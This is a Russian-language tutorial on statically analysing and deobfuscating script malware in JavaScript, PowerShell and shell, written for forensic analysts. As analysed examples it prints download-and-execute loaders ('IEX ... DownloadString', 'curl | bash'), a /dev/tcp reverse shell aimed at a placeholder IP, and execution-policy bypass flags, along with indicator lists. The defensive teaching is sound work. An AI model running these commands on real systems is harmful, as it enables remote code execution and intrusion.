## Вопрос, с которого всё начинается

Малварь всё чаще не бинарник, а **скрипт**: JavaScript, PowerShell, shell. Их легко
обфусцировать и запустить без компиляции. Разберём, как распознать и распутать.

## Наш пример: обфусцированный JS

## Шаг 1: что видно

```
$ head -c 300 sample.js
var _0x1a2b=["\x68\x74\x74\x70...","\x62\x61\x73\x68"...];(function(_0x3c4d,_0x5e6f){...})();
```

Шестнадцатеричные escape-последовательности и случайные имена — классическая
обфускация (обфускатор типа `javascript-obfuscator`).

## Шаг 2: декодируем строки

Строки собираются из hex/массивов. Быстрый способ — выполнить только построение
строк в песочнице (Node.js `vm` без I/O):

```
$ node -e "console.log(Buffer.from('68747470','hex').toString())"
http
```

Или использовать `de4js`/`js-beautify` + ручной разбор. Цель — получить читаемый код.

## Шаг 3: PowerShell

Обфускация в PowerShell — через Base64 и `-EncodedCommand`:

```
PS> [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABj...'))
$c = 'http://203.0.113.5/x'; IEX (New-Object Net.WebClient).DownloadString($c)
```

`IEX` + `DownloadString` = скачивание и исполнение. Это ядро «файл-less» атаки.

## Шаг 4: shell-загрузчики

```
$ cat loader.sh
curl -s http://203.0.113.5/x | bash
```

Или через `eval`, `base64 -d`, `nc`. Просто, но эффективно.

## Шаг 5: что искать

- URL и IP;
- команды (`IEX`, `eval`, `curl|bash`);
- кодировки (Base64, hex, gzip);
- вызовы системных API;
- persistence-команды (crontab, Run-ключ).

## Что мы теперь знаем

- Скриптовая малварь = JS/PowerShell/shell-загрузчик.
- Обфускация: hex-строки, случайные имена, Base64.
- `IEX`+`DownloadString` — типовой PowerShell-загрузчик.
- `curl|bash` — простейший shell-загрузчик.
- Декодируй строки в изолированной песочнице.

## Если не сработало

- Многослойная обфускация? Декодируй по слоям.
- Выполнение кода при разборе? Используй статический парсер, не запускай.
- Нужна логика? Динамический анализ в песочнице.

## PowerShell: механика обфускации

PowerShell — любимый инструмент атакующих на Windows. Ключевые приёмы:

- **`-EncodedCommand`** — команда передаётся в **Base64 от UTF-16LE** (не ASCII!).
  Декодирование:

```
PS> [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBFAFgA...'))
IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/x')
```

- **`IEX` / `Invoke-Expression`** — исполнение строки, полученной извне;
- **`DownloadString`/`Invoke-WebRequest`/`Net.WebClient`** — загрузка второго этапа;
- **конкатенация и обратные кавычки** — разрывают сигнатуры (`I`+`E`+`X`, `` `I`EX ``);
- **переменные окружения и `[char]`** — сборка строк посимвольно;
- **`-nop -w hidden -ep bypass`** — обход политики исполнения и скрытый запуск.

Разбор без исполнения: используй **AST-парсер** PowerShell:

```
PS> $tokens=$null;$errors=$null
PS> [System.Management.Automation.Language.Parser]::ParseFile('evil.ps1',[ref]$tokens,[ref]$errors)
```

Так видны команды и строки без запуска кода. Никогда не запускай образец напрямую.

## JavaScript-загрузчики (WSH, HTA, JSE)

Windows исполняет `.js`/`.jse` через Windows Script Host (`wscript`/`cscript`), а `.hta`
— как HTML-приложение. Типовые приёмы:

- **`ActiveXObject("WScript.Shell").Run(...)`** — запуск процесса;
- **`ActiveXObject("MSXML2.XMLHTTP")`** — загрузка полезной нагрузки;
- **`eval`/`unescape`/`String.fromCharCode`** — динамическое построение кода;
- **hex/unicode-escape** (`\x68\x74\x74\x70`) — обфускация строк;
- **`mshta http://...`** — исполнение HTA прямо по URL.

Обфускатор `javascript-obfuscator` создаёт массивы строк и функции-декодеры. Разбор:

```
$ node -e "console.log(Buffer.from('68747470','hex').toString())"
http
```

Или `de4js` / `js-beautify` для восстановления читаемого кода. Цель — получить
исходный URL и команду, а не «запустить и посмотреть».

## Shell-скрипты: curl|bash и reverse shell

Linux/macOS-загрузчики часто однострочники:

```
$ curl -fsSL http://203.0.113.5/x.sh | bash
$ bash -c "$(curl -fsSL http://203.0.113.5/x.sh)"
$ bash -i >& /dev/tcp/203.0.113.5/4444 0>&1
```

`/dev/tcp` — встроенный в bash редирект, дающий **reverse shell** без внешних
инструментов. Признаки в артефактах: строки `curl|bash`, `base64 -d`, `/dev/tcp`,
`chmod +x /tmp/*`, `nohup ... &`. В истории shell и в логах процессов (`auditd`,
`execve`) эти команды видны целиком.

## Инструменты разбора

- **CyberChef** — декодирование Base64/hex, распаковка, регулярные выражения в браузере;
- **`de4js`**, **`js-beautify`** — деобфускация JavaScript;
- **PowerShell AST** — разбор без исполнения;
- **`oletools`/`oledump`** — если скрипт вложен в документ;
- **`shellcheck`** — понять логику shell-скрипта;
- **`box-js`** — эмуляция JS-малвари в песочнице.

Работай в изолированной ВМ/песочнице, отключив сеть: образцы активно «звонят домой».

## YARA и IOC

Для скриптовой малвари полезны YARA-правила по характерным строкам: `IEX`,
`DownloadString`, `FromBase64String`, `ActiveXObject`, `/dev/tcp/`, `eval(`,
`WScript.Shell`. IOC — домены/IP второго этапа, пути `/tmp/`, `%TEMP%`, имена файлов.
В отчёте перечисли декодированные строки и восстановленную цепочку: загрузчик →
второй этап → действие (майнер, stealer, ransomware).

## Что писать в отчёте

Опиши тип скрипта, использованную обфускацию и **как** ты её снял, декодированные
URL/команды, цепочку исполнения и артефакты на диске/в памяти. Приведи фрагменты
кода, подтверждающие вывод, но не запускай образец. Различай наблюдаемое (строка в
файле) и интерпретацию (её назначение).

## Практический разбор: цепочка в фишинговом вложении

Пришло письмо с вложением `invoice.js`. Ход анализа без запуска:

1. **Тип файла.** `file invoice.js` — «JavaScript source». `head -c 200` показывает
   hex-escape массив и случайные имена — обфускация.
2. **Деобфускация строк.** Запускаем только построение массива в изолированном Node:

```
$ node -e "const a=['\x68\x74\x74\x70...']; console.log(a.join(''))"
```

Получаем URL `http://203.0.113.5/a.ps1`.
3. **Смотрим логику.** Ищем `ActiveXObject("WScript.Shell")` и `.Run(...)`: скрипт
   запускает PowerShell с `-EncodedCommand`.
4. **Декодируем PowerShell.** Base64 → UTF-16LE → текст: `IEX (New-Object
   Net.WebClient).DownloadString('http://203.0.113.5/p.ps1')`.
5. **Второй этап.** Если есть — деобфусцируем тем же путём; обычно это загрузчик
   stealer'а или майнера.
6. **Фиксируем IOC.** URL, IP, пути (`%TEMP%`), имена файлов, строки для YARA.

Итог — полная цепочка «JS → PowerShell → второй этап» с доказательствами.

## Декодирование: пошагово

Общий порядок для любого скриптового образца:

1. **Определи тип** (`file`, расширение, сигнатура).
2. **Найди кодировки** — Base64 (`FromBase64String`, длинные алфавитные строки),
   hex (`\x`, `0x`), `[char]`-массивы, конкатенация.
3. **Декодируй послойно** — по одному уровню за раз, фиксируя результат.
4. **Восстанови строки** — выпиши URL, пути, команды.
5. **Пойми логику** — какой cmdlet/функция запускает загрузку/исполнение.
6. **Не исполняй** — используй статический разбор (AST, деобфускатор, эмулятор).

Каждый слой записывай в отчёт: так видно, как получен вывод, и его можно перепроверить.

## Частые ошибки и подводные камни

- **Запуск образца для «посмотреть».** Это самый частый и самый опасный промах:
  скрипт активно связывается с C2. Только статический разбор.
- **Двойное декодирование.** Base64 может быть от Base64; декодируй до осмысленного
  текста, а не один раз.
- **UTF-16LE vs ASCII.** PowerShell `-EncodedCommand` — это UTF-16LE; декодирование
  как ASCII даёт «кракозябры».
- **Путаница `IEX` и `Invoke-Expression`.** Это одно и то же; обфускаторы используют
  оба написания и разрывы (`I`+`E`+`X`).
- **Игнорирование `mshta`/`.hta`.** HTA исполняется как приложение — не путай с
  обычным HTML.

## Сводная таблица индикаторов

| Приём                 | Индикатор в скрипте                         |
|-----------------------|---------------------------------------------|
| Скачивание второго этапа | `DownloadString`, `XMLHTTP`, `Invoke-WebRequest` |
| Исполнение строки     | `IEX`, `Invoke-Expression`, `eval`, `mshta`  |
| Кодирование           | `FromBase64String`, `\x`, `[char]`, `unescape` |
| Запуск процесса       | `WScript.Shell`, `ActiveXObject`, `.Run`     |
| Reverse shell         | `/dev/tcp/`, `bash -i`, `nc -e`              |
| Обход защиты          | `-ep bypass`, `-nop`, `-w hidden`            |

Эта таблица — быстрый способ классифицировать образец по нескольким строкам.

## Изоляция и безопасный анализ

Скриптовую малварь разбирают в **изолированной ВМ** с отключённой сетью (или с
подменённым DNS/симулятором C2). Снимок ВМ делают до анализа и откатывают после.
Никогда не анализируй образец на рабочей машине и не запускай вложения из письма.
Для динамического анализа — только в песочнице с записью API и без выхода в интернет.
Статический разбор (деобфускация, AST) безопасен и часто достаточен.

## Расшифровка PowerShell EncodedCommand на практике

Base64 в PowerShell — это UTF-16LE, а не ASCII. Правильная последовательность:

```
$ echo 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA' | base64 -d | iconv -f UTF-16LE -t UTF-8
IEX (New-Object Net.WebClient)
```

Частая ошибка — декодировать только Base64 и остановиться: получается «мусор» из-за
неверной кодировки. Добавь `iconv -f UTF-16LE`. Если строка декодируется в ещё одну
Base64-строку — декодируй повторно, пока не получишь осмысленный код. В отчёт
включай каждый слой отдельно: исходная строка → Base64 → UTF-16LE → текст команды.

## Мини-чек-лист разбора скрипта

1. Определи тип и язык (JS / PowerShell / shell / HTA).
2. Найди кодировки (Base64, hex, `[char]`, `unescape`).
3. Декодируй послойно, фиксируя каждый уровень.
4. Выпиши URL, IP, пути, имена файлов.
5. Найди функцию запуска (`IEX`, `eval`, `.Run`, `mshta`).
6. Восстанови цепочку: загрузчик → второй этап → действие.
7. Сформируй IOC и YARA-строки.
8. Задокументируй метод, не запуская образец.

Этого достаточно, чтобы безопасно разобрать типовой скриптовый загрузчик и описать
его в отчёте.

## Почему это распространено

Скриптовая малварь не требует компиляции, легко обфусцируется и часто проходит
мимо антивирусов, которые ищут сигнатуры бинарников. Windows Script Host, PowerShell
и shell есть на любой системе, поэтому атакующему достаточно одной строки, чтобы
загрузить второй этап. Именно поэтому фишинговые вложения всё чаще — `.js`, `.hta`,
`.ps1` и `.lnk`. Понимание приёмов обфускации и умение декодировать без запуска —
базовый навык форензик-аналитика.

## Ключевой вывод

Разбор скриптовой малвари — это дисциплина **статического** анализа: определить тип,
снять слои обфускации, выписать IOC и восстановить цепочку, ни разу не запустив
образец. Тот, кто умеет декодировать PowerShell и JavaScript без исполнения, видит
атаку целиком — от фишингового вложения до второго этапа — и документирует её
воспроизводимо.
